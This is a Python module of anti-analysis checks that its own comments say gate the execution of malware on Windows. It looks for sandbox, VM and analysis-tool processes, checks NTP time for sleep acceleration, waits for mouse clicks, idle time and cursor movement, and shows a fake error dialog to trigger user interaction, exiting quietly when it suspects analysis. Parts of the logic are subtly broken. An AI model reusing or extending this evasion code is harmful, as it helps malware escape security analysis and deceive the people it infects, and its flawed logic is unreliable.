from ctypes import *
import os,time,win32api,sys,datetime,socket,struct

def getIdleTime():
    return (win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0

def getNTPTime():
	client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	client.sendto((("1b").decode("hex") + 47 * ("01").decode("hex")), ("us.pool.ntp.org",123))
	msg, address = client.recvfrom(1024)
	return datetime.datetime.utcfromtimestamp(struct.unpack("!12I",msg)[10] - 2208988800)

#                            #
#   modules needed above     #
#   functions bellow         #
#                            #

def check_click():
    count = 0
    min_clicks = 10

    if len(sys.argv) == 2:
        min_clicks = int(sys.argv[1])

    while count < min_clicks:
        new_state_left_click = win32api.GetAsyncKeyState(1)
        new_state_right_click = win32api.GetAsyncKeyState(2)

        if new_state_left_click % 2 == 1:
            count += 1
        if new_state_right_click % 2 == 1:
            count += 1
    # Now the user has clicked 10 times, the malware will be executed
    return True

def check_cursor_pos():
    sleeping_time = 60

    x, y = win32api.GetCursorPos()
    print("x: " + str(x) + ", y: " + str(y))

    time.sleep(sleeping_time)

    x2, y2 = win32api.GetCursorPos()
    print("x: " + str(x2) + ", y: " + str(y2))

    if x - x2 == 0 and y - y2 == 0:
        return False
    else:
        return True

def check_sleep_acceleration():
    sleeping_time = 60

    first_time = getNTPTime()
    time.sleep(sleeping_time)
    second_time = getNTPTime()
    difference = second_time - first_time
    if difference.seconds >= sleeping_time:
        pass
    else:
        return False 

def check_idle_time():
    idle_time = getIdleTime()
    idle_time = str(idle_time).split('.')[0]
    if int(idle_time[0]) >= 60:
        return False
    else:
        return True

def check_sandbox_in_process():
    EvidenceOfSandbox = []
    sandbox_processes = "vmsrvc", "tcpview", "wireshark", "visual basic", "fiddler", "vmware", "vbox", "process explorer", "autoit", "vboxtray", "vmtools", "vmrawdsk", "vmusbmouse", "vmvss", "vmscsi", "vmxnet", "vmx_svga", "vmmemctl", "df5serv", "vboxservice", "vmhgfs", "vmtoolsd"
    runningProcess = []
    for item in os.popen("tasklist").read().splitlines()[4:]:
        runningProcess.append(item.split())
    for process in runningProcess:
        for sandbox_process in sandbox_processes:
            if sandbox_process in process:
                if process not in EvidenceOfSandbox:
                    EvidenceOfSandbox.append(process)
                    break

    if not EvidenceOfSandbox:
        return True
    else:
        return False

def display_prompt():
    dialogBoxTitle = "Error";
    dialogBoxMessage = "An error has occurred, try again later."
    MessageBox = windll.user32.MessageBoxA
    try:
        MessageBox(None, dialogBoxMessage, dialogBoxTitle, 0x10)
    except:
        return False
    else:
        #Now the user has clicked on the prompt, the malware will be executed
        return True

def check(click,cursor_pos,sleep_acceleration,idle_time,sandbox_process,prompt):
    if sandbox_process == 1:
        if check_sandbox_in_process() == False:
            sys.exit(0)
    if sleep_acceleration == 1:
        if check_sleep_acceleration() == False:
            sys.exit(0)
    if prompt == 1:
        if display_prompt() == False:
            sys.exit(0)
    if idle_time == 1:
        if check_idle_time() == False:
            sys.exit(0)
    if click == 1:
        if check_click() == False:
            sys.exit(0)
    if cursor_pos == 1:
        if check_cursor_pos() == False:
            sys.exit(0)
    return True

def check_all():
    if check_sandbox_in_process() == False:
        sys.exit(0)

    if check_sleep_acceleration() == False:
        sys.exit(0)
        
    if display_prompt() == False:
        sys.exit(0)

    if check_idle_time() == False:
        sys.exit(0)

    if check_click() == False:
        sys.exit(0)

    if check_cursor_pos() == False:
        sys.exit(0)

    return True